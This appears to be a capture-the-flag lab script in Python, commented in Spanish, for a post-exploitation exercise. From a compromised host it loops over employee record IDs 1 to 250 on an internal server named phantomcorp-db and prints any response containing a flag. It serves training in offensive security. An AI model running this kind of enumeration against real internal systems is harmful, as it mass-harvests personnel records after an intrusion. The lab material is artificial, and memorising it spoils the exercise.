#!/usr/bin/env python3
"""
recolector.py — Lab 08 · Post-explotación
Automatiza la enumeración de los 250 legajos del host interno phantomcorp-db
y encuentra el que contiene el flag.

Uso (desde dentro del host víctima):
    python3 recolector.py

Argumentos opcionales:
    --host   URL base del host interno (default: http://phantomcorp-db)
    --start  ID inicial (default: 1)
    --end    ID final   (default: 250)
"""
import urllib.request
import argparse
import sys

def fetch(url: str) -> str:
    """Hace un GET a la URL y devuelve el cuerpo como string."""
    try:
        with urllib.request.urlopen(url, timeout=3) as r:
            return r.read().decode(errors="replace")
    except Exception as e:
        return f"ERROR: {e}"

def buscar_flag(host: str, start: int, end: int) -> None:
    print(f"[*] Enumerando legajos {start}–{end} en {host}")
    encontrados = []

    for i in range(start, end + 1):
        url = f"{host}/empleado?id={i}"
        resp = fetch(url)

        # Mostrar progreso cada 50 requests
        if i % 50 == 0:
            print(f"    ... {i}/{end}", flush=True)

        # Detectar el flag (formato FLAG{...})
        if "FLAG{" in resp:
            print(f"\n[!] FLAG encontrado en id={i}:")
            print(f"    {resp.strip()}")
            encontrados.append((i, resp.strip()))

    if encontrados:
        print(f"\n[+] Total de flags encontrados: {len(encontrados)}")
        for id_, contenido in encontrados:
            print(f"    id={id_}: {contenido}")
    else:
        print("\n[-] No se encontró ningún flag en el rango especificado.")

def main():
    ap = argparse.ArgumentParser(description="Recolector de legajos — Lab 08")
    ap.add_argument("--host",  default="http://phantomcorp-db",
                    help="URL base del host interno")
    ap.add_argument("--start", type=int, default=1,
                    help="ID inicial (default: 1)")
    ap.add_argument("--end",   type=int, default=250,
                    help="ID final (default: 250)")
    a = ap.parse_args()

    buscar_flag(a.host, a.start, a.end)

if __name__ == "__main__":
    sys.exit(main())
